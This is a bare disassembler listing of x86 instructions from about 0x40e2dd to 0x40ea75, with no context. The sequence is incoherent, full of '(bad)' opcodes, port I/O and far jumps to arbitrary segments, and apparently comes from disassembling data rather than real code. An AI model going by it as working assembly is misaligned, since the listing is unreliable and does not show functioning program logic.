  40e2dd:	in     eax,0xbb
  40e2df:	outs   dx,DWORD PTR ds:[esi]
  40e2e0:	es loopne 0x40e2d7
  40e2e3:	xor    BYTE PTR [esi-0x4c2357ad],ch
  40e2e9:	and    ebp,DWORD PTR [ecx]
  40e2eb:	jmp    DWORD PTR ds:0x394363e0
  40e2f1:	add    DWORD PTR [eax],esi
  40e2f3:	pop    ss
  40e2f4:	and    BYTE PTR [eax+esi*1],cl
  40e2f7:	test   eax,0xe08ed57
  40e2fc:	in     eax,dx
  40e2fd:	sub    BYTE PTR [esi],bl
  40e2ff:	push   0xab647d8c
  40e304:	cmc    
  40e305:	xchg   esp,eax
  40e306:	mov    edi,0x51ca3cac
  40e30b:	xor    dl,ch
  40e30d:	xchg   esi,eax
  40e30e:	fs jmp 0x4def:0x1ad49cc0
  40e316:	dec    eax
  40e317:	call   0xb8fb:0xd38605bd
  40e31e:	jg     0x40e389
  40e320:	ss pcmpeqb mm5,mm5
  40e324:	mov    edx,0x824642a9
  40e329:	cdq    
  40e32a:	jo     0x40e379
  40e32c:	cmp    al,0xb6
  40e32e:	xor    eax,0x8cf2e07
  40e333:	shl    DWORD PTR [edi+0x7c75ba71],cl
  40e339:	ja     0x40e315
  40e33b:	js     0x40e31e
  40e33d:	cli    
  40e33e:	mov    ch,0xf6
  40e340:	std    
  40e341:	sbb    dh,ah
  40e343:	shr    BYTE PTR [eax+edi*1-0x21544b2b],cl
  40e34a:	in     al,0xf9
  40e34c:	mov    al,es:0x9cc23802
  40e352:	inc    eax
  40e353:	sub    BYTE PTR [edx+0x6697c017],dl
  40e359:	mov    dl,0xc0
  40e35b:	inc    ebp
  40e35c:	xor    al,0xd8
  40e35e:	cwde   
  40e35f:	arpl   WORD PTR [edi+0x7f],bx
  40e362:	lods   eax,DWORD PTR ds:[esi]
  40e363:	(bad)  
  40e364:	jb     0x40e306
  40e366:	(bad)  
  40e367:	push   esi
  40e368:	mov    cl,0x8
  40e36a:	sub    BYTE PTR [esi],al
  40e36c:	dec    esi
  40e36d:	enter  0x3c76,0x76
  40e371:	test   al,0x60
  40e373:	int    0x90
  40e375:	push   es
  40e376:	or     DWORD PTR [ebp-0x72d40222],esp
  40e37c:	xchg   ebx,eax
  40e37d:	jbe    0x40e39b
  40e37f:	ror    DWORD PTR [ecx-0x2930a051],1
  40e385:	pop    ss
  40e386:	inc    eax
  40e387:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40e389:	xor    edx,edi
  40e38b:	push   ss
  40e38c:	popa   
  40e38d:	cli    
  40e38e:	sbb    BYTE PTR [esi-0x60],0xf1
  40e392:	test   BYTE PTR [eax],bh
  40e394:	add    al,0xf9
  40e396:	mov    dh,BYTE PTR [eax-0x23]
  40e399:	lahf   
  40e39a:	pop    ebx
  40e39b:	mov    WORD PTR [edi-0x614de43d],?
  40e3a1:	div    BYTE PTR [ebx-0x15c1402]
  40e3a7:	add    edi,ebp
  40e3a9:	inc    ebx
  40e3aa:	ins    BYTE PTR es:[edi],dx
  40e3ab:	jbe    0x40e410
  40e3ad:	push   edx
  40e3ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3af:	fsub   st(7),st
  40e3b1:	dec    ecx
  40e3b2:	pop    eax
  40e3b3:	jmp    0x40e354
  40e3b5:	arpl   WORD PTR [eax+0x5485fb82],cx
  40e3bb:	fsub   st(5),st
  40e3bd:	sbb    DWORD PTR [ecx-0x70e890ac],eax
  40e3c3:	je     0x40e428
  40e3c5:	jge    0x40e3d9
  40e3c7:	adc    DWORD PTR [edi],ecx
  40e3c9:	jmp    0x40e357
  40e3cb:	ret    0x7f10
  40e3ce:	xor    ah,BYTE PTR [edx+0x138a24b]
  40e3d4:	or     bl,BYTE PTR [ebx+ebp*1+0x49]
  40e3d8:	push   esi
  40e3d9:	push   edi
  40e3da:	push   ecx
  40e3db:	mov    bl,0x6a
  40e3dd:	aad    0x7a
  40e3df:	dec    ebx
  40e3e0:	cmp    cl,BYTE PTR [ebx]
  40e3e2:	mov    fs,esp
  40e3e4:	sar    bl,1
  40e3e6:	aam    0x15
  40e3e8:	sbb    DWORD PTR [ebx+0x1a],ebx
  40e3eb:	call   0xfe41:0x3327ec15
  40e3f2:	outs   dx,DWORD PTR ds:[esi]
  40e3f3:	inc    esi
  40e3f4:	lods   al,BYTE PTR ds:[esi]
  40e3f5:	cdq    
  40e3f6:	xchg   ebx,eax
  40e3f7:	es and al,0x87
  40e3fa:	jns    0x40e3f6
  40e3fc:	mov    al,ds:0x487c7112
  40e401:	dec    edi
  40e402:	ds add al,0xae
  40e405:	and    BYTE PTR [ecx+ebp*8-0x1d],dl
  40e409:	rcl    BYTE PTR [eax-0x59a28a86],0xaf
  40e410:	iret   
  40e411:	sbb    esp,ecx
  40e413:	jne    0x40e407
  40e415:	xlat   BYTE PTR ds:[ebx]
  40e416:	add    BYTE PTR [edx+0x5c],0xbe
  40e41a:	aam    0x7b
  40e41c:	adc    al,0x66
  40e41e:	in     eax,0xfe
  40e420:	int    0x44
  40e422:	fdiv   st(5),st
  40e424:	jne    0x40e3bf
  40e426:	push   edx
  40e427:	jle    0x40e49f
  40e429:	pushf  
  40e42a:	xchg   edi,eax
  40e42b:	mov    esi,ebx
  40e42d:	imul   edi,ebx,0xffffff94
  40e430:	dec    esi
  40e431:	call   0xb77e5b06
  40e436:	ja     0x40e409
  40e438:	fidivr DWORD PTR ss:[ebp-0x502755a8]
  40e43f:	add    eax,edi
  40e441:	cld    
  40e442:	xchg   ebx,eax
  40e443:	sub    DWORD PTR [ebp-0x3c],ebp
  40e446:	dec    ebp
  40e447:	mov    eax,ds:0xfb354e58
  40e44c:	dec    eax
  40e44d:	xchg   edx,eax
  40e44e:	sbb    DWORD PTR [edi],ebx
  40e450:	add    eax,0xff8be3bb
  40e455:	out    0xdc,eax
  40e457:	mov    ecx,0xdfbf5c4c
  40e45c:	push   edi
  40e45d:	pop    ss
  40e45e:	add    eax,0x1a37e67d
  40e463:	mov    edx,0xf5a50b4e
  40e468:	rcr    BYTE PTR [eax-0x77],cl
  40e46b:	fs pop edx
  40e46d:	inc    esp
  40e46e:	inc    ecx
  40e46f:	pop    edx
  40e470:	xchg   edx,eax
  40e471:	push   esi
  40e472:	js     0x40e47f
  40e474:	mov    bl,0x4a
  40e476:	mov    ecx,DWORD PTR [eax+0x22]
  40e479:	hlt    
  40e47a:	push   ebx
  40e47b:	xchg   BYTE PTR [ecx-0x17],ch
  40e47e:	xor    al,0xb9
  40e480:	add    ah,bh
  40e482:	hlt    
  40e483:	das    
  40e484:	test   al,0x39
  40e486:	mov    dh,0xbd
  40e488:	ret    0x5076
  40e48b:	fwait
  40e48c:	icebp  
  40e48d:	jle    0x40e46f
  40e48f:	ja     0x40e4da
  40e491:	outs   dx,BYTE PTR ds:[esi]
  40e492:	hlt    
  40e493:	mov    bh,0x3d
  40e495:	cld    
  40e496:	sbb    DWORD PTR [eax+0x296450c],0x98e34901
  40e4a0:	push   ebx
  40e4a1:	adc    al,0x71
  40e4a3:	outs   dx,DWORD PTR ds:[esi]
  40e4a4:	pop    es
  40e4a5:	out    dx,al
  40e4a6:	inc    ebx
  40e4a7:	sbb    DWORD PTR [esi+eax*4-0x28],eax
  40e4ab:	int    0x37
  40e4ad:	and    esp,edx
  40e4af:	mov    al,0x40
  40e4b1:	fnstsw ax
  40e4b3:	push   edx
  40e4b4:	cwde   
  40e4b5:	xor    BYTE PTR [ebx+0x66cdcefa],ch
  40e4bb:	or     bl,al
  40e4bd:	dec    ebp
  40e4be:	cdq    
  40e4bf:	mov    ?,WORD PTR [ecx-0x7d]
  40e4c2:	sub    al,0x2b
  40e4c4:	repnz popa 
  40e4c6:	pop    ecx
  40e4c7:	inc    esi
  40e4c8:	jb     0x40e52d
  40e4ca:	adc    al,0x24
  40e4cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4cd:	pop    ecx
  40e4ce:	push   0xffffffb3
  40e4d0:	out    dx,eax
  40e4d1:	sub    eax,0x1aae3184
  40e4d6:	sub    ebx,ebx
  40e4d8:	repz xor al,0xd7
  40e4db:	xor    al,ah
  40e4dd:	pusha  
  40e4de:	outs   dx,DWORD PTR ds:[esi]
  40e4df:	sub    edx,esp
  40e4e1:	(bad)  
  40e4e3:	push   esi
  40e4e4:	aad    0x10
  40e4e6:	dec    eax
  40e4e7:	mov    bl,0xc8
  40e4e9:	add    BYTE PTR [edi],bh
  40e4eb:	dec    ebp
  40e4ec:	in     eax,dx
  40e4ed:	add    eax,0x159f964
  40e4f2:	inc    eax
  40e4f3:	cmp    bl,BYTE PTR [esi-0x7f6be429]
  40e4f9:	inc    esi
  40e4fa:	sbb    DWORD PTR [edx],ebx
  40e4fc:	repz mov ah,0x49
  40e4ff:	test   al,0xdf
  40e501:	fstp   QWORD PTR [edx+0x29]
  40e504:	loop   0x40e549
  40e506:	or     bl,BYTE PTR [ebp-0x7460042f]
  40e50c:	mov    ecx,0xa41d4045
  40e511:	ss pop ebp
  40e513:	mov    eax,ds:0x5b9e0fd
  40e518:	and    ebp,edx
  40e51a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e51b:	icebp  
  40e51c:	aam    0x31
  40e51e:	scas   al,BYTE PTR es:[edi]
  40e51f:	xor    eax,0xb44ef8fd
  40e524:	ds loope 0x40e548
  40e527:	arpl   WORD PTR [esi+0xf9bab1e],ax
  40e52d:	and    eax,0x44829b7f
  40e532:	or     eax,0x316dee0e
  40e537:	xlat   BYTE PTR ds:[ebx]
  40e538:	lods   al,BYTE PTR ds:[esi]
  40e539:	rcr    DWORD PTR [esp+eiz*4],0xc2
  40e53d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e53e:	das    
  40e53f:	pusha  
  40e540:	cmc    
  40e541:	or     al,0x5a
  40e543:	pop    ebp
  40e544:	imul   ebp,DWORD PTR [esi-0x24898b24],0x9db4061b
  40e54e:	add    al,0x47
  40e550:	in     eax,0x44
  40e552:	retf   
  40e553:	mov    al,0x3f
  40e555:	mov    ds:0x1ea1cc47,eax
  40e55a:	mov    edi,edi
  40e55c:	sar    BYTE PTR [ebp+eax*1-0x2a865a74],1
  40e563:	or     al,0x93
  40e565:	cmp    ecx,0xffffffdd
  40e568:	cmp    BYTE PTR [eax-0x1],0xe8
  40e56c:	cmp    BYTE PTR [eax-0x5b],cl
  40e56f:	setb   bl
  40e572:	(bad)  
  40e573:	rol    DWORD PTR [eax],cl
  40e575:	fbstp  TBYTE PTR [ebp+0x74d44a56]
  40e57b:	dec    edi
  40e57c:	mov    ah,0x65
  40e57e:	or     eax,0x9c985344
  40e583:	ins    DWORD PTR es:[edi],dx
  40e584:	xor    dl,BYTE PTR [ebp-0x5a03a2fa]
  40e58a:	mov    dl,0x24
  40e58c:	fild   WORD PTR [esi-0x1021687d]
  40e592:	std    
  40e593:	shr    BYTE PTR [ebx+0x61],cl
  40e596:	mov    bl,0x94
  40e598:	push   es
  40e599:	and    eax,0xdb07581
  40e59e:	pop    esp
  40e59f:	push   cs
  40e5a0:	xchg   esp,eax
  40e5a1:	add    al,0xe1
  40e5a3:	cmp    DWORD PTR [esi+0x351eaa43],esp
  40e5a9:	aad    0xc1
  40e5ab:	mov    bh,0x22
  40e5ad:	pushf  
  40e5ae:	and    eax,0x49357bd0
  40e5b3:	fcmovnbe st,st(6)
  40e5b5:	ins    DWORD PTR es:[edi],dx
  40e5b6:	fwait
  40e5b7:	dec    ebx
  40e5b8:	sahf   
  40e5b9:	jo     0x40e59d
  40e5bb:	ror    BYTE PTR [edx-0x35],0xe7
  40e5bf:	aam    0x8
  40e5c1:	and    al,0x81
  40e5c3:	cmp    ch,al
  40e5c5:	repnz std 
  40e5c7:	jo     0x40e60f
  40e5c9:	les    edx,FWORD PTR [ebp+0x4fca12a0]
  40e5cf:	jg     0x40e56b
  40e5d1:	xor    esp,esi
  40e5d3:	cli    
  40e5d4:	and    bh,BYTE PTR [ecx+0x2c34096]
  40e5da:	mov    eax,0x1ba74f32
  40e5df:	xchg   BYTE PTR [esi+eax*8+0x75e91864],bh
  40e5e6:	imul   ebx,DWORD PTR [eax+eax*1+0x26],0xffffffcd
  40e5eb:	xchg   edi,eax
  40e5ec:	pop    esi
  40e5ed:	jp     0x40e576
  40e5ef:	xchg   esi,eax
  40e5f0:	xor    al,0x17
  40e5f2:	adc    bh,BYTE PTR [edi-0x6234043f]
  40e5f8:	jnp    0x40e5df
  40e5fa:	or     cl,dh
  40e5fc:	sub    al,0xc7
  40e5fe:	shr    BYTE PTR [esi+0x37fb8c18],0x2c
  40e605:	xchg   edx,eax
  40e606:	push   ds
  40e607:	jmp    0x8a64d8af
  40e60c:	and    dh,BYTE PTR [ebp-0x3ba317]
  40e612:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e614:	paddsw mm6,QWORD PTR [esi]
  40e617:	xor    al,0xb7
  40e619:	lds    esp,FWORD PTR [edi-0x7c410311]
  40e61f:	and    eax,0x20e7cad2
  40e624:	push   0xdb7fc6fb
  40e629:	add    dl,BYTE PTR [ebx-0x13]
  40e62c:	loope  0x40e624
  40e62e:	push   esi
  40e62f:	pop    ebx
  40e630:	fistp  QWORD PTR [ebp+0x40]
  40e633:	dec    edx
  40e634:	rcl    DWORD PTR [esi+eiz*8],0xb7
  40e638:	gs iret 
  40e63a:	scas   al,BYTE PTR es:[edi]
  40e63b:	outs   dx,BYTE PTR ds:[esi]
  40e63c:	cmc    
  40e63d:	push   es
  40e63e:	pop    ds
  40e63f:	xor    edx,DWORD PTR ds:[ebx]
  40e642:	add    ebx,DWORD PTR [ebx+0x4615df4f]
  40e648:	jns    0x40e63b
  40e64a:	xchg   DWORD PTR [edi+0x7b],ebp
  40e64d:	pop    esi
  40e64e:	loop   0x40e5d8
  40e650:	stos   BYTE PTR es:[edi],al
  40e651:	xchg   edx,eax
  40e652:	das    
  40e653:	jmp    0x21bd:0x2c0d71bd
  40e65a:	jmp    0x40e671
  40e65c:	mov    bh,0x34
  40e65e:	ficom  WORD PTR [eax-0x1221ce8c]
  40e664:	mov    fs,WORD PTR [eax+0x2a87bded]
  40e66a:	mov    esp,0xbc87db6
  40e66f:	outs   dx,DWORD PTR ds:[esi]
  40e670:	jp     0x40e6b0
  40e672:	out    dx,eax
  40e673:	xchg   dl,dh
  40e675:	mov    esp,0xdde15c10
  40e67a:	jo     0x40e69f
  40e67c:	ss (bad) 
  40e67f:	add    ecx,DWORD PTR [eax+ecx*8+0x4ba1c5d2]
  40e686:	mov    dh,0xf4
  40e688:	pop    ecx
  40e689:	es mov eax,0xa2808e6e
  40e68f:	push   ss
  40e690:	(bad)  
  40e692:	mov    ebx,0x2ad4b1ac
  40e697:	call   0xb7dd:0xd4bd9332
  40e69e:	bound  eax,QWORD PTR [esi+0x28e8017a]
  40e6a4:	lock sbb al,0x74
  40e6a7:	mov    al,0x1d
  40e6a9:	xchg   esi,eax
  40e6aa:	inc    dh
  40e6ac:	mov    esi,0xf49e189d
  40e6b1:	ror    DWORD PTR [esi+0x1d31ab85],0x9a
  40e6b8:	inc    ecx
  40e6b9:	pop    es
  40e6ba:	dec    ebx
  40e6bb:	repnz mov ds:0xc3b950c2,al
  40e6c1:	ja     0x40e735
  40e6c3:	sbb    ebx,DWORD PTR [ebx-0x265a008]
  40e6c9:	leave  
  40e6ca:	xor    dl,BYTE PTR ds:0x8780107f
  40e6d0:	sahf   
  40e6d1:	adc    bl,al
  40e6d3:	inc    ebp
  40e6d4:	lea    ebx,[esi]
  40e6d6:	aas    
  40e6d7:	jmp    0x296c:0xd2ad0c2e
  40e6de:	outs   dx,BYTE PTR ds:[esi]
  40e6df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6e0:	(bad)  
  40e6e1:	test   eax,0xd7b6f2ff
  40e6e6:	pushf  
  40e6e7:	retf   
  40e6e8:	pop    es
  40e6e9:	push   ss
  40e6ea:	and    eax,0x246a24e5
  40e6ef:	and    eax,0x34489f4a
  40e6f4:	jg     0x40e73f
  40e6f6:	mov    DWORD PTR [ecx+0x9],esp
  40e6f9:	mov    ds,esi
  40e6fb:	enter  0xeb33,0x4e
  40e6ff:	jecxz  0x40e6e2
  40e701:	scas   al,BYTE PTR es:[edi]
  40e702:	sbb    bl,0xf8
  40e705:	jns    0x40e766
  40e707:	and    al,0x60
  40e709:	mov    ?,WORD PTR [edi-0x66]
  40e70c:	push   0xffffff85
  40e70e:	les    edx,FWORD PTR [ecx]
  40e710:	rcr    BYTE PTR [ebx-0x73c111f8],1
  40e716:	add    BYTE PTR [esi],dh
  40e718:	mov    al,ds:0x7d23a03b
  40e71d:	jns    0x40e765
  40e71f:	mov    fs,WORD PTR [edi+ebx*1+0x5b]
  40e723:	lahf   
  40e724:	mov    ds:0xa910b0d3,al
  40e729:	mov    al,0x56
  40e72b:	sbb    DWORD PTR [edx+0x1e],ebx
  40e72e:	loopne 0x40e785
  40e730:	and    dl,BYTE PTR [ebp+0x1fd630ab]
  40e736:	sbb    DWORD PTR [eax+0x3161f3cb],edi
  40e73c:	xor    cl,BYTE PTR [edi]
  40e73e:	out    dx,al
  40e73f:	adc    dh,al
  40e741:	ret    
  40e742:	sbb    eax,0x70ac9139
  40e747:	xchg   esp,eax
  40e748:	std    
  40e749:	out    dx,eax
  40e74a:	mov    bh,0x75
  40e74c:	imul   ebx,ebx,0xffffffd1
  40e74f:	jg     0x40e7b7
  40e751:	sub    al,0xc7
  40e753:	imul   eax,ebp,0xffffffa6
  40e756:	lods   eax,DWORD PTR ds:[esi]
  40e757:	fs and ecx,esi
  40e75a:	cdq    
  40e75b:	les    edx,FWORD PTR [esi+esi*1]
  40e75e:	into   
  40e75f:	jb     0x40e762
  40e761:	xchg   esp,eax
  40e762:	daa    
  40e763:	retf   
  40e764:	ds in  eax,dx
  40e766:	jnp    0x40e7de
  40e768:	xchg   DWORD PTR [esi-0x6f2cf8fe],ebp
  40e76e:	sbb    al,dh
  40e770:	push   ss
  40e771:	inc    esp
  40e772:	scas   al,BYTE PTR es:[edi]
  40e773:	mov    ch,0xc8
  40e775:	push   ebx
  40e776:	mov    dl,BYTE PTR [ebx]
  40e778:	stos   DWORD PTR es:[edi],eax
  40e779:	push   esp
  40e77a:	cmp    al,bl
  40e77c:	push   0xffffffa9
  40e77e:	sub    ebx,DWORD PTR [edi+0x3]
  40e781:	xor    eax,0x92f98a1b
  40e786:	(bad)  [edi+0x35]
  40e789:	jo     0x40e791
  40e78b:	mov    eax,ds:0xdb475a1b
  40e790:	add    eax,0x7615e29f
  40e795:	push   ecx
  40e796:	push   esp
  40e797:	push   0x950f8638
  40e79c:	in     al,dx
  40e79d:	push   cs
  40e79e:	repz rol BYTE PTR [edx+eiz*4+0x44],0xb8
  40e7a4:	test   al,0xd3
  40e7a6:	aas    
  40e7a7:	gs pop ecx
  40e7a9:	outs   dx,DWORD PTR ds:[esi]
  40e7aa:	xor    eax,0x44b989a6
  40e7af:	jno    0x40e735
  40e7b1:	loop   0x40e79c
  40e7b3:	mov    WORD PTR [edi-0x45],ss
  40e7b6:	and    DWORD PTR [esi-0x2b],0x862f0216
  40e7bd:	imul   edx,DWORD PTR [edx],0xd192c2e5
  40e7c3:	sbb    cl,BYTE PTR [edx]
  40e7c5:	fild   QWORD PTR [esp+edx*4+0x13b9ef04]
  40e7cc:	sub    al,0x2c
  40e7ce:	mov    al,ds:0xb91d1ad7
  40e7d3:	jo     0x40e797
  40e7d5:	or     DWORD PTR [ebp-0x54b418],edi
  40e7db:	out    0x63,al
  40e7dd:	and    al,0x95
  40e7df:	or     DWORD PTR [ebx-0x25],edx
  40e7e2:	stos   DWORD PTR es:[edi],eax
  40e7e3:	shl    BYTE PTR [esi],0xcc
  40e7e6:	xor    BYTE PTR [eax+eiz*1-0x19f2fe9c],al
  40e7ed:	ins    DWORD PTR es:[edi],dx
  40e7ee:	or     eax,0x78251beb
  40e7f3:	dec    ebx
  40e7f4:	xchg   ebp,eax
  40e7f5:	or     al,bh
  40e7f7:	jnp    0x40e81a
  40e7f9:	ror    DWORD PTR [eax+0x7ab373ec],1
  40e7ff:	xchg   edx,eax
  40e800:	mov    bl,0x1b
  40e802:	sahf   
  40e803:	in     eax,dx
  40e804:	cld    
  40e805:	jmp    0x53c9:0x3bfde4d
  40e80c:	or     ah,BYTE PTR [ecx+0x57]
  40e80f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e810:	mov    eax,0x4be762f9
  40e815:	mov    ds:0xa27146de,eax
  40e81a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e81b:	push   ds
  40e81c:	jae    0x40e884
  40e81e:	push   ebx
  40e81f:	mov    bl,0xf6
  40e821:	and    eax,0x6cfe3482
  40e826:	cmp    eax,0x99f4ce7e
  40e82b:	test   eax,0x2f46f45f
  40e830:	data16 mov ah,0x18
  40e833:	and    bh,BYTE PTR [edx+edx*1]
  40e836:	lahf   
  40e837:	test   al,0x15
  40e839:	or     al,0x74
  40e83b:	or     DWORD PTR [edi],eax
  40e83d:	mov    ebp,0x26656208
  40e842:	test   ecx,esp
  40e844:	mov    ebx,0x60ee2075
  40e849:	or     edi,DWORD PTR [edx]
  40e84b:	push   es
  40e84c:	sub    al,0xff
  40e84e:	je     0x40e8cb
  40e850:	push   eax
  40e851:	jmp    0x22e7b27d
  40e856:	lock add cl,BYTE PTR [ebp-0x6e]
  40e85a:	or     al,0x60
  40e85c:	and    ch,dh
  40e85e:	adc    edi,edi
  40e860:	inc    ebx
  40e861:	mov    bh,0xd
  40e863:	popa   
  40e864:	fiadd  WORD PTR [ecx+0x2c]
  40e867:	cmp    DWORD PTR [ebx+ebp*4],esi
  40e86a:	imul   esp,DWORD PTR [edx-0x3b],0x3989214f
  40e871:	aam    0xbc
  40e873:	aaa    
  40e874:	or     DWORD PTR [esi+0x2d39a350],edx
  40e87a:	sbb    cl,ch
  40e87c:	jge    0x40e8be
  40e87e:	call   0x4446a555
  40e883:	cdq    
  40e884:	fs enter 0xc27e,0xbe
  40e889:	jnp    0x40e891
  40e88b:	in     eax,0x4f
  40e88d:	lahf   
  40e88e:	shl    DWORD PTR [ebp+0x4372f456],1
  40e894:	push   0xf1784e8d
  40e899:	and    ecx,ebx
  40e89b:	jnp    0x40e863
  40e89d:	add    ebp,edi
  40e89f:	adc    al,0x4a
  40e8a1:	push   cs
  40e8a2:	aad    0x3d
  40e8a4:	sub    BYTE PTR [ebp+0x6f064b73],ch
  40e8aa:	mov    bh,0xed
  40e8ac:	cmp    dh,bh
  40e8ae:	inc    esi
  40e8af:	scas   eax,DWORD PTR es:[edi]
  40e8b0:	pop    ebx
  40e8b1:	scas   eax,DWORD PTR es:[edi]
  40e8b2:	push   esi
  40e8b3:	push   edi
  40e8b4:	stos   DWORD PTR es:[edi],eax
  40e8b5:	es je  0x40e8a6
  40e8b8:	fld    st(4)
  40e8ba:	cld    
  40e8bb:	xchg   esp,eax
  40e8bc:	rcr    DWORD PTR [edx-0x40],0x8
  40e8c0:	sbb    DWORD PTR [eax+0x7ee90e49],ecx
  40e8c6:	pop    ecx
  40e8c7:	xor    al,0x15
  40e8c9:	xor    al,0x86
  40e8cb:	mov    DWORD PTR fs:[eax-0x2ed9cced],ebx
  40e8d2:	mov    bl,0xd5
  40e8d4:	loopne 0x40e8fa
  40e8d6:	jns    0x40e902
  40e8d8:	jno    0x40e868
  40e8da:	(bad)  
  40e8db:	div    ebx
  40e8dd:	aad    0x65
  40e8df:	call   0x5200f53e
  40e8e4:	mov    esp,0xbbc30a63
  40e8e9:	loope  0x40e899
  40e8eb:	xor    eax,0xbbf1274f
  40e8f0:	mov    ds:0xe40f5d17,al
  40e8f5:	scas   eax,DWORD PTR es:[edi]
  40e8f6:	imul   ecx,DWORD PTR [ebx+0x29d00562],0xe
  40e8fd:	jnp    0x40e8d0
  40e8ff:	in     al,dx
  40e900:	dec    edx
  40e901:	mov    ebp,0x2466a58f
  40e906:	leave  
  40e907:	ret    
  40e908:	adc    al,BYTE PTR [ebx+0x40e625e9]
  40e90e:	ja     0x40e8fb
  40e910:	sub    ecx,0xffffffa1
  40e913:	mov    esi,0x322b9aef
  40e918:	pop    edi
  40e919:	jne    0x40e922
  40e91b:	into   
  40e91c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e91d:	add    al,BYTE PTR [ebx-0x4a]
  40e920:	fist   DWORD PTR [esi]
  40e922:	jmp    0x1c94f609
  40e927:	sub    ebp,esi
  40e929:	icebp  
  40e92a:	jne    0x40e921
  40e92c:	mov    al,ds:0xd50afbdb
  40e931:	std    
  40e932:	scas   al,BYTE PTR es:[edi]
  40e933:	sub    al,0xe2
  40e935:	sbb    BYTE PTR [ebp+0x72],cl
  40e938:	stos   DWORD PTR es:[edi],eax
  40e939:	arpl   WORD PTR [ebp+edi*1+0x14310f9b],di
  40e940:	stc    
  40e941:	mov    DWORD PTR [ecx],ebx
  40e943:	cmp    esi,DWORD PTR [ebp-0x306b3703]
  40e949:	lea    ebx,[ebp-0x19625684]
  40e94f:	xchg   edx,eax
  40e950:	jmp    DWORD PTR [ecx]
  40e952:	mov    ebx,ebp
  40e954:	pop    ebx
  40e955:	pop    ecx
  40e956:	xchg   esi,eax
  40e957:	jb     0x40e950
  40e959:	xor    dl,BYTE PTR [ebp+0xd]
  40e95c:	sbb    ebx,DWORD PTR [edi+ebx*4+0x13]
  40e960:	push   ebp
  40e961:	push   esi
  40e962:	ds sbb al,0x2b
  40e965:	inc    ecx
  40e966:	das    
  40e967:	loopne 0x40e9a8
  40e969:	shl    bh,cl
  40e96b:	dec    esp
  40e96c:	ja     0x40e9c5
  40e96e:	mov    dh,0x8c
  40e970:	adc    DWORD PTR [ebp+ecx*4-0x63],0x5f
  40e975:	push   cs
  40e976:	cmp    al,0x8f
  40e978:	or     esi,eax
  40e97a:	jmp    0x40e932
  40e97c:	dec    esp
  40e97d:	inc    esi
  40e97e:	add    al,0xac
  40e980:	inc    ebp
  40e981:	mov    cl,0xba
  40e983:	add    BYTE PTR [ebp+0x24a37f0],dh
  40e989:	fstp   QWORD PTR [edi+0x1a]
  40e98c:	pushf  
  40e98d:	xchg   ecx,eax
  40e98e:	jmp    0x40e9fa
  40e990:	retf   0x56dd
  40e993:	mov    dl,0xd6
  40e995:	iret   
  40e996:	scas   eax,DWORD PTR es:[edi]
  40e997:	fbstp  TBYTE PTR [edi+0x11]
  40e99a:	jbe    0x40e990
  40e99c:	cmp    bh,BYTE PTR [ebx-0x4d76af9d]
  40e9a2:	mov    dl,0x91
  40e9a4:	in     eax,dx
  40e9a5:	ds pusha 
  40e9a7:	data16 jno 0x40e95c
  40e9aa:	push   esi
  40e9ab:	mov    BYTE PTR [edi],0x88
  40e9ae:	xchg   edx,eax
  40e9af:	(bad)  
  40e9b1:	pop    esp
  40e9b2:	ror    esi,1
  40e9b4:	jmp    0xd8f21477
  40e9b9:	fcomp  QWORD PTR ds:0xfb9b5b04
  40e9bf:	std    
  40e9c0:	scas   al,BYTE PTR es:[edi]
  40e9c1:	ins    DWORD PTR es:[edi],dx
  40e9c2:	(bad)  
  40e9c3:	clc    
  40e9c4:	mov    ?,WORD PTR ds:0x5b01cba9
  40e9ca:	(bad)  
  40e9cb:	mov    cl,0xa2
  40e9cd:	stos   DWORD PTR es:[edi],eax
  40e9ce:	dec    edi
  40e9cf:	int3   
  40e9d0:	push   ds
  40e9d1:	push   ss
  40e9d2:	or     al,0xcc
  40e9d4:	pop    esp
  40e9d5:	xlat   BYTE PTR ds:[ebx]
  40e9d6:	out    0x28,eax
  40e9d8:	mov    al,ds:0x8f096323
  40e9dd:	fiadd  DWORD PTR [ebx-0x3f5f17ad]
  40e9e3:	sub    BYTE PTR [eax-0x586057db],cl
  40e9e9:	xchg   DWORD PTR [edx-0x2c4e841d],esp
  40e9ef:	pop    ecx
  40e9f0:	fcmovne st,st(4)
  40e9f2:	sbb    BYTE PTR [ecx+0x2dbfa514],ah
  40e9f8:	repnz push edx
  40e9fa:	fisub  WORD PTR [ecx+0x5d]
  40e9fd:	push   ebx
  40e9fe:	test   DWORD PTR [ebx+eiz*4+0x14],edx
  40ea02:	mov    ch,0x11
  40ea04:	sbb    eax,0x2690612f
  40ea09:	fwait
  40ea0a:	adc    bh,BYTE PTR [edi-0x4448547b]
  40ea10:	push   ds
  40ea11:	imul   esi,DWORD PTR [eax+0x67a80629],0x9cbcd9b6
  40ea1b:	mov    edx,0xa6b17654
  40ea20:	mov    ebp,0x84dfd1c7
  40ea25:	add    eax,0x9a3a1093
  40ea2a:	and    ebx,DWORD PTR [edi+eax*2]
  40ea2d:	gs adc eax,0x15faac86
  40ea33:	or     al,0x1b
  40ea35:	inc    esp
  40ea36:	je     0x40ea36
  40ea38:	jnp    0x40e9e3
  40ea3a:	and    eax,0xad2e7b72
  40ea3f:	dec    edx
  40ea40:	xchg   BYTE PTR [edx],ah
  40ea42:	imul   edx,DWORD PTR [ebx-0x15500e4b],0x8d3eaab5
  40ea4c:	inc    esi
  40ea4d:	sub    BYTE PTR [ecx-0x4b],dh
  40ea50:	sahf   
  40ea51:	ror    BYTE PTR [esi+0x6c2a234b],1
  40ea57:	mov    ebx,0x967a3d36
  40ea5c:	mov    BYTE PTR [esi],ch
  40ea5e:	and    al,0xfb
  40ea60:	cwde   
  40ea61:	in     eax,0xbf
  40ea63:	or     BYTE PTR [ebx+0x73651057],dh
  40ea69:	aad    0xd6
  40ea6b:	mov    esp,0xed34dc4a
  40ea70:	xor    eax,0x19b453f8
  40ea75:	cmp    BYTE PTR [ebx-0x7527987a],bh
